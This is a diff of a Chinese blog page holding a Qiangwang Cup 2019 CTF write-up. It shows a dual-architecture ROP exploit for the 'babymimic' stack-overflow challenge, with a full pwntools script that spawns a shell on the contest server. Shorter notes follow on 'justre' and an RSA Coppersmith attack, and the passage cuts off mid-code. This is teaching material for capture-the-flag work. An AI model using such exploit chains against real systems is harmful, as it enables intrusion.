@@ -1,36 +1,36 @@
 <!DOCTYPE html>
 <html lang=en>
-<head><meta name="generator" content="Hexo 3.9.0">
+<head>
     <!-- so meta -->
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-    <meta name="description" content="babymimic拟态防御…惊了 程序提供了两个EFL文件: 32位: https://github.com/Inv0k3r/pwnable_files/raw/master/_stkof 64位: https://github.com/Inv0k3r/pwnable_files/raw/master/__stkof 漏洞点都很明显, 都是简单的栈溢出 32位:  64位:  检查保护, 虽然开了">
-<meta name="keywords" content="ctf">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="babymimic拟态防御…惊了 程序提供了两个EFL文件: 32位: https:&#x2F;&#x2F;github.com&#x2F;Inv0k3r&#x2F;pwnable_files&#x2F;raw&#x2F;master&#x2F;_stkof 64位: https:&#x2F;&#x2F;github.com&#x2F;Inv0k3r&#x2F;pwnable_files&#x2F;raw&#x2F;master&#x2F;__stkof 漏洞点都很明显, 都是简单的栈溢出 32位:  64位:  检查保护, 虽然开了">
 <meta property="og:type" content="article">
 <meta property="og:title" content="强网杯2019">
-<meta property="og:url" content="http://1nv0k3r.me/2019/01/18/强网杯2019/index.html">
+<meta property="og:url" content="http://1nv0k3r.fun/2019/01/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2019/index.html">
 <meta property="og:site_name" content="1nv0k3r&#39;s blog">
-<meta property="og:description" content="babymimic拟态防御…惊了 程序提供了两个EFL文件: 32位: https://github.com/Inv0k3r/pwnable_files/raw/master/_stkof 64位: https://github.com/Inv0k3r/pwnable_files/raw/master/__stkof 漏洞点都很明显, 都是简单的栈溢出 32位:  64位:  检查保护, 虽然开了">
-<meta property="og:locale" content="en">
-<meta property="og:image" content="http://1nv0k3r.me/2019/01/18/强网杯2019/2.png">
-<meta property="og:image" content="http://1nv0k3r.me/2019/01/18/强网杯2019/3.png">
-<meta property="og:image" content="http://1nv0k3r.me/2019/01/18/强网杯2019/4.png">
-<meta property="og:image" content="http://1nv0k3r.me/2019/01/18/强网杯2019/5.png">
-<meta property="og:image" content="http://1nv0k3r.me/2019/01/18/强网杯2019/6.png">
-<meta property="og:image" content="http://1nv0k3r.me/2019/01/18/强网杯2019/7.png">
-<meta property="og:image" content="http://1nv0k3r.me/2019/01/18/强网杯2019/8.png">
-<meta property="og:image" content="http://1nv0k3r.me/2019/01/18/强网杯2019/9.png">
-<meta property="og:image" content="http://1nv0k3r.me/2019/01/18/强网杯2019/10.png">
-<meta property="og:image" content="http://1nv0k3r.me/2019/01/18/强网杯2019/11.png">
-<meta property="og:image" content="http://1nv0k3r.me/2019/01/18/强网杯2019/12.png">
-<meta property="og:image" content="http://1nv0k3r.me/2019/01/18/强网杯2019/1.png">
-<meta property="og:updated_time" content="2019-05-30T02:13:32.854Z">
+<meta property="og:description" content="babymimic拟态防御…惊了 程序提供了两个EFL文件: 32位: https:&#x2F;&#x2F;github.com&#x2F;Inv0k3r&#x2F;pwnable_files&#x2F;raw&#x2F;master&#x2F;_stkof 64位: https:&#x2F;&#x2F;github.com&#x2F;Inv0k3r&#x2F;pwnable_files&#x2F;raw&#x2F;master&#x2F;__stkof 漏洞点都很明显, 都是简单的栈溢出 32位:  64位:  检查保护, 虽然开了">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://1nv0k3r.fun/2019/01/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2019/2.png">
+<meta property="og:image" content="http://1nv0k3r.fun/2019/01/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2019/3.png">
+<meta property="og:image" content="http://1nv0k3r.fun/2019/01/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2019/4.png">
+<meta property="og:image" content="http://1nv0k3r.fun/2019/01/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2019/5.png">
+<meta property="og:image" content="http://1nv0k3r.fun/2019/01/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2019/6.png">
+<meta property="og:image" content="http://1nv0k3r.fun/2019/01/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2019/7.png">
+<meta property="og:image" content="http://1nv0k3r.fun/2019/01/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2019/8.png">
+<meta property="og:image" content="http://1nv0k3r.fun/2019/01/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2019/9.png">
+<meta property="og:image" content="http://1nv0k3r.fun/2019/01/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2019/10.png">
+<meta property="og:image" content="http://1nv0k3r.fun/2019/01/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2019/11.png">
+<meta property="og:image" content="http://1nv0k3r.fun/2019/01/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2019/12.png">
+<meta property="og:image" content="http://1nv0k3r.fun/2019/01/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2019/1.png">
+<meta property="article:published_time" content="2019-01-18T11:41:05.000Z">
+<meta property="article:modified_time" content="2019-05-30T02:13:32.854Z">
+<meta property="article:author" content="1nv0k3r">
+<meta property="article:tag" content="ctf">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="强网杯2019">
-<meta name="twitter:description" content="babymimic拟态防御…惊了 程序提供了两个EFL文件: 32位: https://github.com/Inv0k3r/pwnable_files/raw/master/_stkof 64位: https://github.com/Inv0k3r/pwnable_files/raw/master/__stkof 漏洞点都很明显, 都是简单的栈溢出 32位:  64位:  检查保护, 虽然开了">
-<meta name="twitter:image" content="http://1nv0k3r.me/2019/01/18/强网杯2019/2.png">
+<meta name="twitter:image" content="http://1nv0k3r.fun/2019/01/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2019/2.png">
     
     
         
@@ -52,15 +52,19 @@
     <!-- title -->
     <title>强网杯2019</title>
     <!-- styles -->
-    <link rel="stylesheet" href="/css/style.css">
+    
+<link rel="stylesheet" href="/css/style.css">
+
     <!-- persian styles -->
     
-      <link rel="stylesheet" href="/css/rtl.css">
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
     
     <!-- rss -->
     
     
-</head>
+<meta name="generator" content="Hexo 4.2.1"></head>
 
 <body class="max-width mx-auto px3 ltr">
     
@@ -86,10 +90,10 @@
     <span id="actions">
       <ul>
         
-        <li><a class="icon" href="/2019/01/19/训练赛记录/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        <li><a class="icon" href="/2019/01/19/%E8%AE%AD%E7%BB%83%E8%B5%9B%E8%AE%B0%E5%BD%95/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
         
         
-        <li><a class="icon" href="/2019/01/18/如何提高git-clone的速度/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        <li><a class="icon" href="/2019/01/18/%E5%A6%82%E4%BD%95%E6%8F%90%E9%AB%98git-clone%E7%9A%84%E9%80%9F%E5%BA%A6/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
         
         <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
         <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
@@ -102,16 +106,16 @@
     <br/>
     <div id="share" style="display: none">
       <ul>
-  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://1nv0k3r.me/2019/01/18/强网杯2019/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=http://1nv0k3r.me/2019/01/18/强网杯2019/&text=强网杯2019"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://1nv0k3r.me/2019/01/18/强网杯2019/&title=强网杯2019"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://1nv0k3r.me/2019/01/18/强网杯2019/&is_video=false&description=强网杯2019"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=强网杯2019&body=Check out this article: http://1nv0k3r.me/2019/01/18/强网杯2019/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=http://1nv0k3r.me/2019/01/18/强网杯2019/&title=强网杯2019"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=http://1nv0k3r.me/2019/01/18/强网杯2019/&title=强网杯2019"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://1nv0k3r.me/2019/01/18/强网杯2019/&title=强网杯2019"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=http://1nv0k3r.me/2019/01/18/强网杯2019/&title=强网杯2019"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://1nv0k3r.me/2019/01/18/强网杯2019/&name=强网杯2019&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://1nv0k3r.fun/2019/01/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2019/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://1nv0k3r.fun/2019/01/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2019/&text=强网杯2019"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://1nv0k3r.fun/2019/01/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2019/&title=强网杯2019"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://1nv0k3r.fun/2019/01/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2019/&is_video=false&description=强网杯2019"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=强网杯2019&body=Check out this article: http://1nv0k3r.fun/2019/01/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2019/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://1nv0k3r.fun/2019/01/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2019/&title=强网杯2019"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://1nv0k3r.fun/2019/01/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2019/&title=强网杯2019"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://1nv0k3r.fun/2019/01/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2019/&title=强网杯2019"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://1nv0k3r.fun/2019/01/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2019/&title=强网杯2019"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://1nv0k3r.fun/2019/01/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2019/&name=强网杯2019&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
@@ -151,7 +155,7 @@
       
     <div class="article-tag">
         <i class="fas fa-tag"></i>
-        <a class="tag-link" href="/tags/ctf/">ctf</a>
+        <a class="tag-link" href="/tags/ctf/" rel="tag">ctf</a>
     </div>
 
 
@@ -166,15 +170,15 @@
 <p>64位: <a href="https://github.com/Inv0k3r/pwnable_files/raw/master/__stkof">https://github.com/Inv0k3r/pwnable_files/raw/master/__stkof</a></p>
 <p>漏洞点都很明显, 都是简单的栈溢出</p>
 <p>32位:</p>
-<p><img src="/2019/01/18/强网杯2019/2.png" alt="img"></p>
+<p><img src="/2019/01/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2019/2.png" alt="img"></p>
 <p>64位:</p>
-<p><img src="/2019/01/18/强网杯2019/3.png" alt="img"></p>
+<p><img src="/2019/01/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2019/3.png" alt="img"></p>
 <p>检查保护, 虽然开了canary, 但是栈溢出的那个函数并没有check, 猜测应该是出题人手动把check nop了</p>
-<p><img src="/2019/01/18/强网杯2019/4.png" alt="img"></p>
+<p><img src="/2019/01/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2019/4.png" alt="img"></p>
 <p>后续测试中, 发现无法leak任何内容, 猜测服务器对返回的内容进行了检测, 由于程序是静态编译的, 所以我们可以尝试构造ROP链来getshell</p>
-<p><img src="/2019/01/18/强网杯2019/5.png" alt="img"></p>
+<p><img src="/2019/01/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2019/5.png" alt="img"></p>
 <p>这里使用ROPGenerator, 生成ROP chain以后, 溢出到返回地址即可getshell</p>
-<p><img src="/2019/01/18/强网杯2019/6.png" alt="img"></p>
+<p><img src="/2019/01/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2019/6.png" alt="img"></p>
 <p>但是打服务器的时候打不下来, 因为服务器用的拟态防御, 我们无法知道交互的是32位程序还是64位程序</p>
 <p>当然我们可以通过不断运行两个架构的攻击脚本来尝试爆破, 但是服务器设置了爆破限制, 随机8位的字符, 然后sha256加密, 给出5位,我们需要爆破另外3位, 这样就降低了爆破成功的可能性(我爆了一天没成功</p>
 <p>所以我们需要一个payload, 来同时对64和32进行攻击</p>
@@ -184,31 +188,31 @@
 <p>由于无法leak任何地址(带出来数据就会触发服务器的check导致连接关闭), 所以我们不知道栈地址, 没法直接跳转</p>
 <p>所以我们可以通过修改栈顶指针寄存器, 来让程序跳转到栈上的另外一个位置</p>
 <p>尝试找一下gadget:</p>
-<p><img src="/2019/01/18/强网杯2019/7.png" alt="img"></p>
+<p><img src="/2019/01/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2019/7.png" alt="img"></p>
 <p>可以写add esp 0xc进去, 那么栈顶将被修改到当前栈地址+ 0xc</p>
 <p>这样一来, 针对32位程序的payload可以写成:</p>
-<pre><code>payload = 272 * &apos;a&apos; + p32(add_esp_0xc) + 0xc* &apos;a&apos; + ROP链
+<pre><code>payload = 272 * &#39;a&#39; + p32(add_esp_0xc) + 0xc* &#39;a&#39; + ROP链
 </code></pre><p>其中的0x10字节, 我们可以用来写64位程序的ROP链</p>
 <p>我们用ROPGenerator生成的ROP chain:</p>
 <p>32位:</p>
-<p><img src="/2019/01/18/强网杯2019/8.png" alt="img"></p>
+<p><img src="/2019/01/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2019/8.png" alt="img"></p>
 <p>64位:</p>
-<p><img src="/2019/01/18/强网杯2019/9.png" alt="img"></p>
+<p><img src="/2019/01/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2019/9.png" alt="img"></p>
 <p>生成的rop链中, 32位的长度为92字节, 64位的长度为112字节</p>
 <p>而我们的payload</p>
 <p><code>payload = 272 * &#39;a&#39; + p32(add_esp_0xc) + 0xc * &#39;a&#39; + 32位ROP链</code>中, 有8字节可用, 所以我们可以写一个<code>add rsp 0x??; ret</code>的方式来进行跳转, 跳到32位ROP链之后, 找一下64位程序的gadget:</p>
-<p><img src="/2019/01/18/强网杯2019/10.png" alt="img"></p>
+<p><img src="/2019/01/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2019/10.png" alt="img"></p>
 <p>各种长度都有，很舒服</p>
 <p>我们32位程序的ROP链, 长度是92字节, 所以我们的64位程序跳转的时候要留给32位ROP链足够空间</p>
 <p>这里选择0x68这个gadget</p>
 <p>那么<code>payload=272 * &#39;a&#39; + p32(add_esp_0xc) + &#39;b&#39; * 4 + p64(add_rsp_0x68) + 92字节的32位程序的ROP + 112字节的64位程序的ROP</code></p>
 <p>后续测试发现ROPGenerator生成的32位ROP链无法getshell…最后换了ROPgadget生成:</p>
 <pre><code>ROPgadget --binary &quot;_stkof&quot; --ropchain
-</code></pre><p><img src="/2019/01/18/强网杯2019/11.png" alt="img"></p>
+</code></pre><p><img src="/2019/01/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2019/11.png" alt="img"></p>
 <p>长度是136字节, 所以对上面payload进行修改, 64位的gadget需要跳到更远, 所以选择了0xd8这个gadget:</p>
-<pre><code>payload=272*&apos;a&apos; + p32(add_esp_0xc) + &apos;b&apos; * 4 + p64(add_rsp_0xd8) + 136字节的32位程序的ROP + (0xd8 - 136) * &apos;c&apos; + 112字节的64位程序的ROP
+<pre><code>payload=272*&#39;a&#39; + p32(add_esp_0xc) + &#39;b&#39; * 4 + p64(add_rsp_0xd8) + 136字节的32位程序的ROP + (0xd8 - 136) * &#39;c&#39; + 112字节的64位程序的ROP
 </code></pre><p>成功getshell:</p>
-<p><img src="/2019/01/18/强网杯2019/12.png" alt="img"></p>
+<p><img src="/2019/01/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2019/12.png" alt="img"></p>
 <p>最终脚本:</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(hash, string)</span>:</span></span><br><span class="line">    dic = <span class="string">'1234567890abcdef'</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> dic:</span><br><span class="line">                <span class="keyword">for</span> l <span class="keyword">in</span> dic:</span><br><span class="line">                    <span class="keyword">for</span> m <span class="keyword">in</span> dic:</span><br><span class="line">                        <span class="keyword">for</span> n <span class="keyword">in</span> dic:</span><br><span class="line">                            temp = string + i + j + k + l + m + n</span><br><span class="line">                            <span class="keyword">if</span> hash == hashlib.sha256(temp.decode(<span class="string">'hex'</span>)).hexdigest():</span><br><span class="line">                                info(<span class="string">"Found: "</span> + temp)</span><br><span class="line">                                <span class="keyword">return</span> temp</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'49.4.51.149'</span>, <span class="number">25391</span>)</span><br><span class="line">r.recvuntil(<span class="string">'hexdigest()='</span>)</span><br><span class="line">hexstr = r.recv(<span class="number">64</span>)</span><br><span class="line">r.recvuntil(<span class="string">"encode('hex')="</span>)</span><br><span class="line">s = r.recv(<span class="number">10</span>)</span><br><span class="line">info(<span class="string">"hash: "</span> + hexstr)</span><br><span class="line">info(<span class="string">"skr:  "</span> + s)</span><br><span class="line">r.sendlineafter(<span class="string">"skr.encode('hex')="</span>, check(hexstr, s))</span><br><span class="line">r.sendlineafter(<span class="string">'teamtoken:'</span>, <span class="string">'068c639545a4febbcbcb8c97b494cc21'</span>)</span><br><span class="line">r.recvuntil(<span class="string">'your flag file --&gt; '</span>)</span><br><span class="line">flag_file_name = r.recv(<span class="number">37</span>)</span><br><span class="line">info(<span class="string">"flag file: "</span> + flag_file_name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># start pwn</span></span><br><span class="line">off = <span class="number">0x0</span></span><br><span class="line">rop64 = <span class="string">''</span></span><br><span class="line">rop64 += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000043b97c</span> + off)  <span class="comment"># pop rax; ret</span></span><br><span class="line">rop64 += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000069e138</span> + off)  <span class="comment"># Constant: 0x69e138</span></span><br><span class="line">rop64 += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000043d9d5</span> + off)  <span class="comment"># pop rdx; ret</span></span><br><span class="line">rop64 += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0068732f6e69622f</span>)        <span class="comment"># Constant: 0x68732f6e69622f</span></span><br><span class="line">rop64 += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000043dbc4</span> + off)  <span class="comment"># mov qword ptr [rax+0x8], rdx; ret</span></span><br><span class="line">rop64 += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x00000000004005f6</span> + off)  <span class="comment"># pop rdi; ret</span></span><br><span class="line">rop64 += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000069e140</span> + off)  <span class="comment"># cmd: '/bin/sh\x00'</span></span><br><span class="line">rop64 += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000405895</span> + off)  <span class="comment"># pop rsi; ret</span></span><br><span class="line">rop64 += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000000000</span>)        <span class="comment"># argv: 0x0</span></span><br><span class="line">rop64 += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000043b97c</span> + off)  <span class="comment"># pop rax; ret</span></span><br><span class="line">rop64 += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000497d37</span> + off)  <span class="comment"># Address of ret</span></span><br><span class="line">rop64 += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000040dc33</span> + off)  <span class="comment"># xor edx, edx; jmp rax</span></span><br><span class="line">rop64 += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000043b97c</span> + off)  <span class="comment"># pop rax; ret</span></span><br><span class="line">rop64 += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000000003b</span>)        <span class="comment"># Constant: 0x3b</span></span><br><span class="line">rop64 += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x00000000004011dc</span> + off)  <span class="comment"># syscall</span></span><br><span class="line"></span><br><span class="line">rop32 = <span class="string">''</span></span><br><span class="line">rop32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806e9cb</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">rop32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080d9060</span>) <span class="comment"># @ .data</span></span><br><span class="line">rop32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080a8af6</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">rop32 += <span class="string">'/bin'</span></span><br><span class="line">rop32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x08056a85</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">rop32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806e9cb</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">rop32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080d9064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">rop32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080a8af6</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">rop32 += <span class="string">'//sh'</span></span><br><span class="line">rop32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x08056a85</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">rop32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806e9cb</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">rop32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080d9068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">rop32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x08056040</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">rop32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x08056a85</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">rop32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080481c9</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">rop32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080d9060</span>) <span class="comment"># @ .data</span></span><br><span class="line">rop32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806e9f2</span>) <span class="comment"># pop ecx ; pop ebx ; ret</span></span><br><span class="line">rop32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080d9068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">rop32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080d9060</span>) <span class="comment"># padding without overwrite ebx</span></span><br><span class="line">rop32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806e9cb</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">rop32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080d9068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">rop32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x08056040</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">rop32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807be5a</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807be5a</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807be5a</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807be5a</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807be5a</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807be5a</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807be5a</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807be5a</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807be5a</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807be5a</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807be5a</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080495a3</span>) <span class="comment"># int 0x80</span></span><br><span class="line"></span><br><span class="line">add_esp_0xc = <span class="number">0x080a8f69</span>           <span class="comment"># : add esp, 0xc ; ret</span></span><br><span class="line">add_rsp_0xd8 = <span class="number">0x00000000004079d4</span>   <span class="comment"># : add rsp, 0xd8 ; ret</span></span><br><span class="line">r.recv()</span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">272</span> + p32(add_esp_0xc) + <span class="string">'b'</span> * <span class="number">4</span> + p64(add_rsp_0xd8) + rop32 + (<span class="number">0xd8</span> - len(rop32)) * <span class="string">'c'</span> + rop64</span><br><span class="line">r.send(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 <h3 id="justre"><a href="#justre" class="headerlink" title="justre"></a>justre</h3><p>定位到check函数, 发现很多xmm指令…</p>
@@ -229,7 +233,7 @@
 [+]m=random.getrandbits(512)
 [+]c=pow(m,e,n)=0x1da185826272d2d806f3b8e036fbe2b27320defe9892175f9e18a60c39348fa2b631d386edeb98f37f18e8059360e827cea76363a3e1aaae46aef40ac0c6621576e41ab644c704a9c662c998618c7d48e17542001142d768fce50d778c3555fd3d795a7b23d72c65f6a96fd4e1e438bcca7dc963adf0baf3b135de994662b82L
 [+]((m&gt;&gt;72)&lt;&lt;72)=0xfabc61918e517c9bf73b2bf5d91f30a80c19de72a995e1c47de8f9be1bb4006b6dd10a11adb95ce73613e6236aa4e91db6d5c8f07dac16000000000000000000L
-[-]long_to_bytes(m).encode(&apos;hex&apos;)=
+[-]long_to_bytes(m).encode(&#39;hex&#39;)=
 </code></pre><p>e = 3, 给了部分明文, 使用CoppersmithAttack</p>
 <figure class="highlight py"><table><tr><td class="code"><pre><span class="line">n=<span class="number">0x381c2a94ae89869e563b600b4b9cce988197a565e027fd923bee484664d33f1a10037857ce9e0c49422470536cef963e540ab1bffbd6fe3dfda54ac04fae790c99568fe064a77d57ea17609f45d5d0f984bd4235f54b4c8b069ceac1220e743e0fcd420a5302eda89dc58497e94a01281849c0134c88d543adda2d423c3af7f</span></span><br><span class="line">e=<span class="number">3</span></span><br><span class="line">c=<span class="number">0x1da185826272d2d806f3b8e036fbe2b27320defe9892175f9e18a60c39348fa2b631d386edeb98f37f18e8059360e827cea76363a3e1aaae46aef40ac0c6621576e41ab644c704a9c662c998618c7d48e17542001142d768fce50d778c3555fd3d795a7b23d72c65f6a96fd4e1e438bcca7dc963adf0baf3b135de994662b82</span></span><br><span class="line">m=<span 